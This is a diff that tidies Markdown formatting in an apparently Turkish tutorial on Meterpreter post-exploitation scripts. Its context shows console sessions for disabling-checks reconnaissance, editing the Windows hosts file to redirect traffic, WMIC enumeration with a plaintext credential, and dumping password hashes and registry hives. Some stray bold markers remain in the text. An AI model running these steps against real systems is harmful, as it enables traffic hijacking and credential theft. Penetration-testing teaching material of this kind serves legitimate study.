@@ -71,7 +71,7 @@ Meterpreter scriptlerinin kullanımı için, hedef sistemde bir şekilde Meterpr
 
 ```bash
  meterpreter > run getcountermeasure  > Running Getcountermeasure on the target... 
- > Checking **for **contermeasures...
+ > Checking for **contermeasures...
  > Getting Windows Built **in **Firewall configuration...
  >    
  >     Domain profile configuration:
@@ -183,16 +183,16 @@ meterpreter > run hostsedit
 
 **[!]** Meterpreter scripts are deprecated. Try post/windows/manage/inject_host.
 **[!]** Example: run post/windows/manage/inject_host OPTION**=**value **[**...]
-This Meterpreter script is **for **adding entries **in **to the Windows Hosts file.
+This Meterpreter script is for **adding entries **in **to the Windows Hosts file.
 Since Windows will check first the Hosts file instead of the configured DNS Server
 it will assist **in **diverting traffic to the fake entry or entries. Either a single
 entry can be provided or a series of entries provided a file with one per line.
 
 OPTIONS:
 
-    -e   Host entry **in **the format of IP,Hostname.
+    -e   Host entry **in the format of IP,Hostname.
     -h        Help Options.
-    -l   Text file with list of entries **in **the format of IP,Hostname. One per line.
+    -l   Text file with list of entries **in the format of IP,Hostname. One per line.
 
 Example:
 
@@ -202,7 +202,7 @@ run hostsedit -e 127.0.0.1,google.com
 run hostsedit -l /tmp/fakednsentries.txt meterpreter > run hostsedit -e 10.211.55.162,www.microsoft.com
  > Making Backup of the hosts file.
  > Backup loacated **in **C:\WINDOWS\System32\drivers\etc\hosts62497.back
- > Adding Record **for **Host <a href="http://www.microsoft.com/">www.microsoft.com</a> with IP 10.211.55.162
+ > Adding Record for **Host <a href="http://www.microsoft.com/">www.microsoft.com</a> with IP 10.211.55.162
  > Clearing the DNS Cache
 ```
 
@@ -235,7 +235,7 @@ meterpreter > run remotewinenum
 **[!]** Meterpreter scripts are deprecated. Try post/windows/gather/wmic_command.
 **[!]** Example: run post/windows/gather/wmic_command OPTION**=**value **[**...]
 Remote Windows Enumeration Meterpreter Script
-This script will enumerate windows hosts **in **the target enviroment
+This script will enumerate windows hosts **in the target enviroment
 given a username and password or using the credential under witch
 Meterpeter is running using WMI wmic windows native tool.
 Usage:
@@ -245,7 +245,7 @@ OPTIONS:
     -h        Help menu.
     -p   Password of user on target system
     -t   The target address
-    -u   User on the target system **(**If not provided it will use credential of process**)** meterpreter > run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128 > Saving report to /root/.msf4/logs/remotewinenum/10.211.55.128_20090711.0142 
+    -u   User on the target system (If not provided it will use credential of process) meterpreter > run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128 > Saving report to /root/.msf4/logs/remotewinenum/10.211.55.128_20090711.0142 
  > Running WMIC Commands ....
  >     running command wimic environment list
  >     running command wimic share list
@@ -284,10 +284,10 @@ meterpreter > run scraper > New session on 10.211.55.128:4444...
  > Dumping password hashes...
  > Obtaining the entire registry...
  > Exporting HKCU
- > Downloading HKCU **(**C:\WINDOWS\TEMP\LQTEhIqo.reg**)**
+ > Downloading HKCU (C:\WINDOWS\TEMP\LQTEhIqo.reg)
  > Cleaning HKCU
  > Exporting HKLM
- > Downloading HKLM **(**C:\WINDOWS\TEMP\GHMUdVWt.reg**)**
+ > Downloading HKLM (C:\WINDOWS\TEMP\GHMUdVWt.reg)
 ```
 
 
